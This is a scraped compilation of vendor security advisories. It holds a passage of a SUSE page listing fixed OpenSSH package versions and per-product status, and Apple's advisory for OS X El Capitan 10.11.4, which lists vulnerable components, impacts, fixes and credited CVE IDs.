| SUSE Linux Enterprise Server 12 SUSE Linux Enterprise Server for SAP Applications 12 | * `openssh >= 6.6p1-33.1` * `openssh-askpass-gnome >= 6.6p1-33.1` * `openssh-fips >= 6.6p1-33.1` * `openssh-helpers >= 6.6p1-33.1` | Patchnames: SUSE-SLE-SERVER-12-2016-85 |
| SUSE Linux Enterprise Server for Raspberry Pi 12 SP2 | * `openssh >= 7.2p2-55.1` * `openssh-fips >= 7.2p2-55.1` * `openssh-helpers >= 7.2p2-55.1` | Patchnames: SUSE Linux Enterprise Server for Raspberry Pi 12 SP2 GA openssh-7.2p2-55.1 |
| SUSE Linux Micro 6.0 | * `openssh >= 9.6p1-1.4` * `openssh-clients >= 9.6p1-1.4` * `openssh-common >= 9.6p1-1.4` * `openssh-fips >= 9.6p1-1.4` * `openssh-server >= 9.6p1-1.4` * `openssh-server-config-rootlogin >= 9.6p1-1.4` | Patchnames: SUSE Linux Micro 6.0 GA openssh-9.6p1-1.4 |
| SUSE Linux Micro 6.1 | * `openssh >= 9.6p1-slfo.1.1_1.6` * `openssh-clients >= 9.6p1-slfo.1.1_1.6` * `openssh-common >= 9.6p1-slfo.1.1_1.6` * `openssh-fips >= 9.6p1-slfo.1.1_1.6` * `openssh-server >= 9.6p1-slfo.1.1_1.6` * `openssh-server-config-rootlogin >= 9.6p1-slfo.1.1_1.6` | Patchnames: SUSE Linux Micro 6.1 GA openssh-9.6p1-slfo.1.1\_1.6 |
| openSUSE Leap 15.0 | * `openssh >= 7.6p1-lp150.7.4` * `openssh-helpers >= 7.6p1-lp150.7.4` | Patchnames: openSUSE Leap 15.0 GA openssh-7.6p1-lp150.7.4 |
| openSUSE Leap 15.2 | * `openssh >= 8.1p1-lp152.3.2` * `openssh-helpers >= 8.1p1-lp152.3.2` | Patchnames: openSUSE Leap 15.2 GA openssh-8.1p1-lp152.3.18 |
| openSUSE Leap 15.3 | * `openssh >= 8.4p1-1.30` * `openssh-clients >= 8.4p1-1.30` * `openssh-common >= 8.4p1-1.30` * `openssh-server >= 8.4p1-1.30` | Patchnames: openSUSE Leap 15.3 GA openssh-8.4p1-1.30 |
| openSUSE Leap 15.4 | * `openssh >= 8.4p1-3.9.1` * `openssh-clients >= 8.4p1-3.9.1` * `openssh-common >= 8.4p1-3.9.1` * `openssh-server >= 8.4p1-3.9.1` | Patchnames: openSUSE Leap 15.4 GA openssh-8.4p1-3.9.1 |
| openSUSE Tumbleweed | * `openssh >= 7.2p2-3.1` * `openssh-cavs >= 7.2p2-3.1` * `openssh-fips >= 7.2p2-3.1` * `openssh-helpers >= 7.2p2-3.1` | Patchnames: openSUSE-Tumbleweed-2024-10174 |

---

### Status of this issue by product and package

Please note that this evaluation state might be work in progress, incomplete or outdated. Also information for service packs in the LTSS phase is only included for issues meeting the LTSS criteria. If in doubt, feel free to contact us for clarification. The updates are grouped by state of their lifecycle. SUSE product lifecycles are documented [on the lifecycle page](https://www.suse.com/lifecycle/).

| Product(s) | Source package | State |
| --- | --- | --- |
| Products past their end of life and not receiving proactive updates anymore. | | |
| SUSE Linux Enterprise Desktop 11 SP2 | openssh | Not affected |
| SUSE Linux Enterprise Desktop 11 SP3 | openssh | Released |
| SUSE Linux Enterprise Desktop 11 SP3 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Desktop 11 SP4 | openssh | Released |
| SUSE Linux Enterprise Desktop 11 SP4 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Desktop 12 | openssh | Released |
| SUSE Linux Enterprise Desktop 12 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Desktop 12 SP1 | openssh | Released |
| SUSE Linux Enterprise Desktop 12 SP1 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Point of Sale 11 SP3 | openssh | Affected |
| SUSE Linux Enterprise Point of Service 11 SP3 | openssh | Unsupported |
| SUSE Linux Enterprise Server 11 SP1-LTSS | openssh | Not affected |
| SUSE Linux Enterprise Server 11 SP2 | openssh | Not affected |
| SUSE Linux Enterprise Server 11 SP2-LTSS | openssh | Not affected |
| SUSE Linux Enterprise Server 11 SP3 | openssh | Released |
| SUSE Linux Enterprise Server 11 SP3 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server 11 SP3-LTSS | openssh | Released |
| SUSE Linux Enterprise Server 11 SP4 | openssh | Released |
| SUSE Linux Enterprise Server 11 SP4 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server 11 SP4 LTSS | openssh | Affected |
| SUSE Linux Enterprise Server 11 SP4-LTSS | openssh | Released |
| SUSE Linux Enterprise Server 11-SECURITY | openssh-openssl1 | Released |
| SUSE Linux Enterprise Server 12 | openssh | Released |
| SUSE Linux Enterprise Server 12 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server 12 SP1 | openssh | Released |
| SUSE Linux Enterprise Server 12 SP1 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server 12 SP1-LTSS | openssh | Released |
| SUSE Linux Enterprise Server 12-LTSS | openssh | Released |
| SUSE Linux Enterprise Server for SAP Applications 11 SP3 | openssh | Released |
| SUSE Linux Enterprise Server for SAP Applications 11 SP3 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server for SAP Applications 11 SP4 | openssh | Released |
| SUSE Linux Enterprise Server for SAP Applications 11 SP4 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 | openssh | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 SP1 | openssh | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 SP1 | openssh-askpass-gnome | Released |
| Security Module for SUSE Linux Enterprise 11 | openssh-openssl1 | Released |

---

### SUSE Timeline for this CVE

CVE page created: Wed Jan 13 11:21:24 2016

CVE page last modified: Tue Dec 17 20:11:02 2024

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from support.apple.com_deb4eedf_20250125_234750.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of OS X El Capitan v10.11.4 and Security Update 2016-002

This document describes the security content of OS X El Capitan v10.11.4 and Security Update 2016-002.

For the protection of our customers, Apple does not disclose, discuss, or confirm security issues until a full investigation has occurred and any necessary patches or releases are available. To learn more about Apple Product Security, see the [Apple Product Security](https://www.apple.com/support/security/) website.

For information about the Apple Product Security PGP Key, see [How to use the Apple Product Security PGP Key](https://support.apple.com/kb/HT201601).

Where possible, [CVE IDs](http://cve.mitre.org/about/) are used to reference the vulnerabilities for further information.

To learn about other security updates, see [Apple security updates](https://support.apple.com/kb/HT201222).

## OS X El Capitan 10.11.4 and Security Update 2016-002

* **apache\_mod\_php**

  Available for: OS X Mavericks v10.9.5, OS X Yosemite v10.10.5, and OS X El Capitan v10.11 to v10.11.3

  Impact: Processing a maliciously crafted .png file may lead to arbitrary code execution

  Description: Multiple vulnerabilities existed in libpng versions prior to 1.6.20. These were addressed by updating libpng to version 1.6.20.

  CVE-ID

  CVE-2015-8126 : Adam Mariš

  CVE-2015-8472 : Adam Mariš

* **AppleRAID**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: A memory corruption issue was addressed through improved input validation.

  CVE-ID

  CVE-2016-1733 : Proteas of Qihoo 360 Nirvan Team

* **AppleRAID**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: A local user may be able to determine kernel memory layout

  Description: An out-of-bounds read issue existed that led to the disclosure of kernel memory. This was addressed through improved input validation.

  CVE-ID

  CVE-2016-1732 : Proteas of Qihoo 360 Nirvan Team

* **AppleUSBNetworking**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: A USB device may be able to cause a denial of service

  Description: An error handling issue existed in packet validation. This issue was addressed through improved error handling.

  CVE-ID

  CVE-2016-1734 : Andrea Barisani and Andrej Rosano of Inverse Path

* **Bluetooth**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: Multiple memory corruption issues were addressed through improved memory handling.

  CVE-ID

  CVE-2016-1735 : Jeonghoon Shin@A.D.D

  CVE-2016-1736 : beist and ABH of BoB

* **Carbon**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: Processing a maliciously crafted .dfont file may lead to arbitrary code execution

  Description: Multiple memory corruption issues existed in the handling of font files. These issues were addressed through improved bounds checking.

  CVE-ID

  CVE-2016-1737 : HappilyCoded (ant4g0nist &r3dsm0k3)

* **dyld**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An attacker may tamper with code-signed applications to execute arbitrary code in the application's context

  Description: A code signing verification issue existed in dyld. This issue was addressed with improved validation.

  CVE-ID

  CVE-2016-1738 : beist and ABH of BoB

* **FontParser**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: Opening a maliciously crafted PDF file may lead to an unexpected application termination or arbitrary code execution

  Description: A memory corruption issue was addressed through improved memory handling.

  CVE-ID

  CVE-2016-1740 : HappilyCoded (ant4g0nist and r3dsm0k3) working with Trend Micro's Zero Day Initiative (ZDI)

* **HTTPProtocol**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: A remote attacker may be able to execute arbitrary code

  Description: Multiple vulnerabilities existed in nghttp2 versions prior to 1.6.0, the most serious of which may have led to remote code execution. These were addressed by updating nghttp2 to version 1.6.0.

  CVE-ID

  CVE-2015-8659

* **Intel Graphics Driver**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: Multiple memory corruption issues were addressed through improved memory handling.

  CVE-ID

  CVE-2016-1743 : Piotr Bania of Cisco Talos

  CVE-2016-1744 : Ian Beer of Google Project Zero

* **IOFireWireFamily**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: A local user may be able to cause a denial of service

  Description: A null pointer dereference was addressed through improved validation.

  CVE-ID

  CVE-2016-1745 : sweetchip of Grayhash

* **IOGraphics**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: A memory corruption issue was addressed through improved input validation.

  CVE-ID

  CVE-2016-1746 : Peter Pi of Trend Micro working with Trend Micro's Zero Day Initiative (ZDI)

  CVE-2016-1747 : Juwei Lin of Trend Micro working with Trend Micro's Zero Day Initiative (ZDI)

* **IOHIDFamily**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to determine kernel memory layout

  Description: A memory corruption issue was addressed through improved memory handling.

  CVE-ID

  CVE-2016-1748 : Brandon Azad

* **IOUSBFamily**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: Multiple memory corruption issues were addressed through improved memory handling.

  CVE-ID

  CVE-2016-1749 : Ian Beer of Google Project Zero and Juwei Lin of Trend Micro working with Trend Micro's Zero Day Initiative (ZDI)

* **Kernel**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: A use after free issue was addressed through improved memory management.

  CVE-ID

  CVE-2016-1750 : CESG

* **Kernel**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: A race condition existed during the creation of new processes. This was addressed through improved state handling.

  CVE-ID

  CVE-2016-1757 : Ian Beer of Google Project Zero and Pedro Vilaça

* **Kernel**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: A null pointer dereference was addressed through improved input validation.

  CVE-ID

  CVE-2016-1756 : Lufeng Li of Qihoo 360 Vulcan Team

* **Kernel**

  Available for: OS X Mavericks v10.9.5, OS X Yosemite v10.10.5, and OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: Multiple memory corruption issues were addressed through improved memory handling.

  CVE-ID

  CVE-2016-1754 : Lufeng Li of Qihoo 360 Vulcan Team

  CVE-2016-1755 : Ian Beer of Google Project Zero

  CVE-2016-1759 : lokihardt

* **Kernel**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to determine kernel memory layout

  Description: An out-of-bounds read issue existed that led to the disclosure of kernel memory. This was addressed through improved input validation.

  CVE-ID

  CVE-2016-1758 : Brandon Azad

* **Kernel**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: Multiple integer overflows were addressed through improved input validation.

  CVE-ID

  CVE-2016-1753 : Juwei Lin Trend Micro working with Trend Micro's Zero Day Initiative (ZDI)

* **Kernel**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to cause a denial of service

  Description: A denial of service issue was addressed through improved validation.

  CVE-ID

  CVE-2016-1752 : CESG

* **libxml2**

  Available for: OS X Mavericks v10.9.5, OS X Yosemite v10.10.5, and OS X El Capitan v10.11 to v10.11.3

  Impact: Processing maliciously crafted XML may lead to unexpected application termination or arbitrary code execution

  Description: Multiple memory corruption issues were addressed through improved memory handling.

  CVE-ID

  CVE-2015-1819

  CVE-2015-5312 : David Drysdale of Google

  CVE-2015-7499

  CVE-2015-7500 : Kostya Serebryany of Google

  CVE-2015-7942 : Kostya Serebryany of Google

  CVE-2015-8035 : gustavo.grieco

  CVE-2015-8242 : Hugh Davenport

  CVE-2016-1761 : wol0xff working with Trend Micro's Zero Day Initiative (ZDI)

  CVE-2016-1762

* **Messages**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: Clicking a JavaScript link can reveal sensitive user information

  Description: An issue existed in the processing of JavaScript links. This issue was addressed through improved content security policy checks.

  CVE-ID

  CVE-2016-1764 : Matthew Bryant of the Uber Security Team (formerly of Bishop Fox), Joe DeMesy and Shubham Shah of Bishop Fox

* **Messages**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An attacker who is able to bypass Apple's certificate pinning, intercept TLS connections, inject messages, and record encrypted attachment-type messages may be able to read attachments

  Description: A cryptographic issue was addressed by rejecting duplicate messages on the client.

  CVE-ID

  CVE-2016-1788 : Christina Garman, Matthew Green, Gabriel Kaptchuk, Ian Miers, and Michael Rushanan of Johns Hopkins University

* **NVIDIA Graphics Drivers**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An application may be able to execute arbitrary code with kernel privileges

  Description: Multiple memory corruption issues were addressed through improved memory handling.

  CVE-ID

  CVE-2016-1741 : Ian Beer of Google Project Zero

* **OpenSSH**

  Available for: OS X Mavericks v10.9.5, OS X Yosemite v10.10.5, and OS X El Capitan v10.11 to v10.11.3

  Impact: Connecting to a server may leak sensitive user information, such as a client's private keys

  Description: Roaming, which was on by default in the OpenSSH client, exposed an information leak and a buffer overflow. These issues were addressed by disabling roaming in the client.

  CVE-ID

  CVE-2016-0777 : Qualys

  CVE-2016-0778 : Qualys

* **OpenSSH**

  Available for: OS X Mavericks v10.9.5 and OS X Yosemite v10.10.5

  Impact: Multiple vulnerabilities in LibreSSL

  Description: Multiple vulnerabilities existed in LibreSSL versions prior to 2.1.8. These were addressed by updating LibreSSL to version 2.1.8.

  CVE-ID

  CVE-2015-5333 : Qualys

  CVE-2015-5334 : Qualys

* **OpenSSL**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: A remote attacker may be able to cause a denial of service

  Description: A memory leak existed in OpenSSL versions prior to 0.9.8zh. This issue was addressed by updating OpenSSL to version 0.9.8zh.

  CVE-ID

  CVE-2015-3195
* **Python**

  Available for: OS X Mavericks v10.9.5, OS X Yosemite v10.10.5, and OS X El Capitan v10.11 to v10.11.3

  Impact: Processing a maliciously crafted .png file may lead to arbitrary code execution

  Description: Multiple vulnerabilities existed in libpng versions prior to 1.6.20. These were addressed by updating libpng to version 1.6.20.

  CVE-ID

  CVE-2014-9495

  CVE-2015-0973

  CVE-2015-8126 : Adam Mariš

  CVE-2015-8472 : Adam Mariš

* **QuickTime**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: Processing a maliciously crafted FlashPix Bitmap Image may lead to unexpected application termination or arbitrary code execution

  Description: Multiple memory corruption issues were addressed through improved memory handling.

  CVE-ID

  CVE-2016-1767 : Francis Provencher from COSIG

  CVE-2016-1768 : Francis Provencher from COSIG

* **QuickTime**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: Processing a maliciously crafted Photoshop document may lead to unexpected application termination or arbitrary code execution

  Description: Multiple memory corruption issues were addressed through improved memory handling.

  CVE-ID

  CVE-2016-1769 : Francis Provencher from COSIG

* **Reminders**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: Clicking a tel link can make a call without prompting the user

  Description: A user was not prompted before invoking a call. This was addressed through improved entitlement checks.

  CVE-ID

  CVE-2016-1770 : Guillaume Ross of Rapid7 and Laurent Chouinard of Laurent.ca

* **Ruby**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: A local attacker may be able to cause unexpected application termination or arbitrary code execution

  Description: An unsafe tainted string usage vulnerability existed in versions prior to 2.0.0-p648. This issue was addressed by updating to version 2.0.0-p648.

  CVE-ID

  CVE-2015-7551

* **Security**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: A local user may be able to check for the existence of arbitrary files

  Description: A permissions issue existed in code signing tools. This was addressed though additional ownership checks.

  CVE-ID

  CVE-2016-1773 : Mark Mentovai of Google Inc.

* **Security**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: Processing a maliciously crafted certificate may lead to arbitrary code execution

  Description: A memory corruption issue existed in the ASN.1 decoder. This issue was addressed through improved input validation.

  CVE-ID

  CVE-2016-1950 : Francis Gabriel of Quarkslab

* **Tcl**

  Available for: OS X Yosemite v10.10.5 and OS X El Capitan v10.11 to v10.11.3

  Impact: Processing a maliciously crafted .png file may lead to arbitrary code execution

  Description: Multiple vulnerabilities existed in libpng versions prior to 1.6.20. These were addressed by removing libpng.

  CVE-ID

  CVE-2015-8126

* **TrueTypeScaler**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

  Description: A memory corruption issue existed in the processing of font files. This issue was addressed through improved input validation.

  CVE-ID

  CVE-2016-1775 : 0x1byte working with Trend Micro's Zero Day Initiative (ZDI)

* **Wi-Fi**

  Available for: OS X El Capitan v10.11 to v10.11.3

  Impact: An attacker with a privileged network position may be able to execute arbitrary code

  Description: A frame validation and memory corruption issue existed for a given ethertype. This issue was addressed through additional ethertype validation and improved memory handling.

  CVE-ID

  CVE-2016-0801 : an anonymous researcher

  CVE-2016-0802 : an anonymous researcher

OS X El Capitan 10.11.4 includes the security content of [Safari 9.1](https://support.apple.com/kb/HT206171).

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: November 03, 2023

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of OS X El Capitan v10.11.4 and Security Update 2016-002

[United States](https://support.apple.com/en-us/103407/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)


